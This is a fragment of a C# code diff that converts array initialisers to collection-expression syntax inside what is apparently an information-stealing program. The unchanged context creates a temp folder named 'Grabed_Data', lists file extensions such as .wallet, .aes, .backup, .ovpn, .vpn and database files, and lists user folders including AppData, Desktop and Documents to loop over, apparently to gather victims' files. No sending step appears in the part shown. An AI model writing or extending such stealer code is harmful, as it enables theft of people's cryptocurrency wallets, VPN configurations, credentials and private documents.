@@ -7,8 +7,8 @@
             try
             {
                 Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "Grabed_Data", "Potentially important files"));
-                string[] extensions = new string[]
-                {
+                string[] extensions =
+                [
                 ".txt", ".pdf", ".ini",
                 ".json", ".dat",
                 ".wallet", ".aes", ".backup",
@@ -23,10 +23,10 @@
                 ".dbf", ".mdb", ".accdb",
                 ".old", ".xml", ".vpn",
                 ".ovpn", ".torrent", ".hexlic"
-                };
+                ];
 
-                string[] directories = new string[]
-                {
+                string[] directories =
+                [
                 Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                 Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                 Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
@@ -36,7 +36,7 @@
                 Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
                 Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                 Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
-                };
+                ];
 
                 foreach (string rootDir in directories)
                 {
